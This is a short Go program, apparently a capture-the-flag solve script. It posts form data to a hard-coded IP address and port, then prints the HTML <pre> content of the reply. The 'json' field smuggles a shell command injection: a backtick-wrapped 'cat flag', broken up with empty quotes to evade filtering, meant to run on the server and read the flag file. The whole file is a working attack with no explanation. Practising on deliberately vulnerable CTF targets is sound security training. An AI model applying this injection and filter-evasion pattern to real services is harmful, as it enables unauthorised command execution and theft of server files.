package main

import (
	"bytes"
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"net/http"
)

func sendJSONToForm(jsonData string) {
	url := "http://140.115.59.7:12001/"

	// Set the data to be sent
	data := map[string]string{
		"json": jsonData,
	}

	// Prepare the request
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(encodeFormData(data)))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	// Set Content-Type header
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// Make the request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error making request:", err)
		return
	}
	defer resp.Body.Close()

	// Check the response status code
	if resp.StatusCode == http.StatusOK {
		// Parse the HTML response
		doc, err := goquery.NewDocumentFromReader(resp.Body)
		if err != nil {
			fmt.Println("Error parsing HTML:", err)
			return
		}

		// Find and print the content within <pre> tags
		tagContent := doc.Find("pre").Text()
		fmt.Println("Content within <pre> tags:")
		fmt.Println(tagContent)
	} else {
		fmt.Println("Error occurred, unable to send JSON data to the form. Status code:", resp.StatusCode)
	}
}

func encodeFormData(data map[string]string) string {
	var encodedData string
	for key, value := range data {
		encodedData += fmt.Sprintf("%s=%s&", key, value)
	}
	return encodedData[:len(encodedData)-1] // Remove trailing '&'
}

func main() {
	// JSON data to send
	jsonToSend := `{"bocchi":"'` + "`c\"\"at fl\"\"ag`'\"}"

	// Call the function to send JSON data to the form
	sendJSONToForm(jsonToSend)
}
